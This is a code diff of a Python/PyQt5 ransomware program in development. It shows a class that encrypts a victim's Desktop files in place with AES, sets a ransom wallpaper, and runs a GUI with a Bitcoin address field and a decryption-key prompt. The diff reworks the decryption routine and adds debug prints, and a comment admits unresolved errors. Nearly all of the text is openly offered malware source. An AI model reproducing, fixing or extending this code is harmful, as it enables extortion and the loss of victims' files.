@@ -101,8 +101,6 @@ class Ransomware(PyQt5.QtCore.QRunnable):  # defines class that inherits from py
             Ransomware.decryptionPass = self.rSeed(32)
         self.encryptionPass = Ransomware.encryptionPass
         self.decryptionPass = Ransomware.decryptionPass
-        # self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
-        # self.decryptionPass = self.rSeed(32)
         print(f"Decryption key generated: {self.decryptionPass}")  # Print decryption key
         self.filePath = "C:\\Users\\{self.userName}\\Desktop\\"  # sets file path attribute
         self.ip = ""  # inits ip attribute to empty string 4 later
@@ -169,27 +167,6 @@ class Ransomware(PyQt5.QtCore.QRunnable):  # defines class that inherits from py
                 f.truncate()  # Truncate the file to remove any remaining plaintext
         except Exception as e:
             print(f"Error encrypting {file}: {e}")
-
-    def decryptFile(self, file):
-        try:
-            key = self.decryptionPass.encode()  # Convert decryption key to bytes
-            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()
-
-            # Read ciphertext
-            with open(file, 'rb+') as f:
-                ciphertext = f.read()
-                plaintext = cipher.update(ciphertext) + cipher.finalize()
-                unpadder = padding.PKCS7(128).unpadder()
-                decrypted_data = unpadder.update(plaintext) + unpadder.finalize()
-
-                # Move file pointer to the beginning of the file
-                f.seek(0)
-
-                # Write decrypted data to the same file
-                f.write(decrypted_data)
-                f.truncate()  # Truncate the file to remove any remaining ciphertext
-        except Exception as e:
-            print(f"Error decrypting {file}: {e}")
 
     def change_file_icon(self, file_name):
         try:
@@ -321,8 +298,9 @@ class Worker(QObject):
 
 
 class RansomwareGUI(QMainWindow):
-    def __init__(self, decryptionPass):
+    def __init__(self, decryptionPass, filePath):
         super().__init__()
+        self.filePath = filePath
 
         # Initialize global variables
         self.btcAdd = ""
@@ -424,37 +402,84 @@ class RansomwareGUI(QMainWindow):
                     encrypted_files.append(filepath)
         return encrypted_files
 
+    def decryptFile(self, file):
+        try:
+            key = self.decryptionPass.encode()  # Convert decryption key to bytes
+            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).decryptor()
+
+            # Read ciphertext
+            with open(file, 'rb+') as f:
+                ciphertext = f.read()
+                plaintext = cipher.update(ciphertext) + cipher.finalize()
+                unpadder = padding.PKCS7(128).unpadder()
+                decrypted_data = unpadder.update(plaintext) + unpadder.finalize()
+
+                # Move file pointer to the beginning of the file
+                f.seek(0)
+
+                # Write decrypted data to the same file
+                f.write(decrypted_data)
+                f.truncate()  # Truncate the file to remove any remaining ciphertext
+        except Exception as e:
+            print(f"Error decrypting {file}: {e}")
+
     def promptDecryptionKey(self):
-        # Prompt for decryption key
-        text, ok = QInputDialog.getText(self, "Enter Decryption Key", "Enter your decryption key:")
+        # Retrieve decryption key from the Ransomware instance
+        decryptionPass = self.decryptionPass
 
-        if ok:
-            decryptionPass = text
-            self.decryptFiles(decryptionPass)  # Pass the obtained decryption key to decryptFiles method
-
-    def decryptFiles(self, decryptionPass):
+        # Check if decryption key is available
         if decryptionPass:
-            print(f"Decryption key for all files: {decryptionPass}")  # Debug statement to print decryption key
-            ransomware_instance = Ransomware()
-        for root, directories, files in os.walk(ransomware_instance.filePath):
-            for filename in files:
-                filepath = os.path.join(root, filename)
-                for base in fileTypes:
-                    if base in filepath:
-                        print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
-                        threading.Thread(target=ransomware_instance.decryptFile,
-                                         args=(filepath, decryptionPass)).start()
-            for directory in directories:  # Iterating over subdirectories
-                try:
-                    for filename in os.listdir(os.path.join(root, directory)):
-                        filepath = os.path.join(root, directory, filename)
-                        for base in fileTypes:
-                            if base in filepath:
-                                print(f"Decrypting file: {filepath}")  # Debug statement to print file being decrypted
-                                threading.Thread(target=ransomware_instance.decryptFile,
-                                                 args=(filepath, decryptionPass)).start()
-                except PermissionError as e:
-                    print(f"PermissionError: {e}. Skipping directory: {directory}")
+            # Prompt the user for decryption key
+            text, ok = QInputDialog.getText(self, "Enter Decryption Key", "Enter your decryption key:")
+
+            # Check if user canceled the input dialog
+            if ok:
+                # Check if the entered decryption key is correct
+                if text == decryptionPass:
+                    print("Correct decryption key")
+                    # If decryption key is correct, proceed with decryption
+                    self.decryptFiles()
+                    print("decryptFiles called")
+                else:
+                    print("Wrong decryption key.")
+        else:
+            print("No decryption key available.")
+
+    def decryptFiles(self):
+        print("Decryptfiles reached")
+        print("DecryptionPass:", self.decryptionPass)
+        print("FilePath:", self.filePath)
+        if self.decryptionPass and self.filePath:
+            print(f"Decryption key for all files: {self.decryptionPass}")
+            for root, directories, files in os.walk(self.filePath):  # doesnt progress past here
+                print("Root:", root)
+                print("Directories:", directories)
+                print("Files:", files)
+                for filename in files:
+                    print("Filename:", filename)
+                    filepath = os.path.join(root, filename)
+                    print("Filepath:", filepath)
+                    for base in fileTypes:
+                        print("Base:", base)
+                        if base in filepath:
+                            print(f"Decrypting file: {filepath}")
+                            threading.Thread(target=self.decryptFile, args=(filepath,)).start()
+                            print(f"Decryption process started for {filepath}")
+                for directory in directories:
+                    print("Directory:", directory)
+                    try:
+                        for filename in os.listdir(os.path.join(root, directory)):
+                            print("Filename in directory:", filename)
+                            filepath = os.path.join(root, directory, filename)
+                            print("Filepath in directory:", filepath)
+                            for base in fileTypes:
+                                print("Base:", base)
+                                if base in filepath:
+                                    print(f"Decrypting file: {filepath}")
+                                    threading.Thread(target=self.decryptFile, args=(filepath,)).start()
+                                    print(f"Decryption process started for {filepath}")
+                    except PermissionError as e:
+                        print(f"PermissionError: {e}. Skipping directory: {directory}")
 
     def initUI(self):
         # Create central widget
@@ -629,6 +654,12 @@ if __name__ == '__main__':
     # Call the function to set the wallpaper
     set_wallpaper(image_filename)
     decryptionPass = Ransomware().decryptionPass
+    userName = os.getlogin()
     app = QApplication(sys.argv)
-    gui = RansomwareGUI(decryptionPass)
+    filePath = "C:\\Users\\Hole\\Desktop\\"
+    gui = RansomwareGUI(decryptionPass, filePath)  # Pass filePath to the constructor
     sys.exit(app.exec_())
+
+    # need to figure out a way for the filePath ^ here to dynamically put the file path
+    # for now it is hardcoded
+    # gives attribute error for gui
